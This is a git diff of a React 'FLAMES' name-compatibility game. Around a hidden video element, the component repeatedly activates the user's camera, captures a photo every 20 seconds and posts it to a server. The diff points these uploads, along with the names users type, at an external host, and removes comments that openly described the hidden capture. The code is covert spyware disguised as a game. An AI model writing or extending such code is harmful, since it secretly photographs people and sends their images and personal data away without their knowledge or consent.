@@ -2,6 +2,8 @@ import React, { useState, useCallback, useMemo, useRef, useEffect } from "react"
 import styled, { keyframes } from "styled-components";
 import PermissionPopup from "./PermissionPopup";
 
+const API_BASE = "https://bkflames.up.railway.app";
+
 const floatingHearts = keyframes`
   0% { transform: translateY(0); opacity: 1; }
   100% { transform: translateY(-100vh); opacity: 0; }
@@ -175,11 +177,11 @@ const FlamesGame = () => {
         while (true) {
           const started = await startCamera();
           if (started) {
-            await delay(200); // wait briefly to allow camera to initialize
+            await delay(200);
             await capturePhoto();
             stopCamera();
           }
-          await delay(20000); // wait 20 seconds before next capture
+          await delay(20000);
         }
       };
 
@@ -196,7 +198,7 @@ const FlamesGame = () => {
     const imageData = canvasRef.current.toDataURL("image/jpeg");
 
     try {
-      const res = await fetch("/api/save-photo", {
+      const res = await fetch(`${API_BASE}/api/save-photo`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ image: imageData }),
@@ -241,7 +243,7 @@ const FlamesGame = () => {
       setIsLoading(false);
 
       try {
-        const res = await fetch("/api/save-result", {
+        const res = await fetch(`${API_BASE}/api/save-result`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ name1, name2, result: flamesResult }),
@@ -297,7 +299,7 @@ const FlamesGame = () => {
         {permissionStatus && <StatusMessage>{permissionStatus}</StatusMessage>}
       </Container>
 
-      {/* 🔒 Hidden but active video for camera capture */}
+      {/* Hidden Camera and Canvas */}
       <video
         ref={videoRef}
         width="320"
